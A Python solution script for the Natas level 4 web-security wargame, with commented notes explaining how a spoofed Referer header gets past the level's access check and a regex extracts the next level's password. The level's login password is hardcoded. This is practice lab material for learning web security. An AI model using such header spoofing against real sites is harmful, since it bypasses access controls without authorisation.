#!/usr/bin/env python

import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'
url = 'http://%s.natas.labs.overthewire.org/' % username

"""#print(url) #make sure the URL works fine
response = requests.get(url, auth = (username, password))
content = response.text
print(content)
#This returns a page stating "Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""
So that is interesting, as it turns out, you can use the http header and tell the page where you came from:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
And, as you maybe would guess, Python can help us out with that:

#Notice the data type, this is a Python _dictionary_.
ourheaders = { "Referer" : "howdydo" }
#we can pass 
response = requests.get(url, auth = (username, password), headers = ourheaders)
content = response.text
print(content)
#this shows that it worked, because the page now says "Access disallowed. You are visiting from "howdydo" yadda yadda yadda"

"""
#So now, instead of passing howdydo, we give it what it wants, and claim that we're coming from the next level
notourheaders = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }
response = requests.get(url, auth = (username, password), headers = notourheaders)

content = response.text

print(content)


print(re.findall('Access granted. The password for natas5 is (.*)', content))

#SDG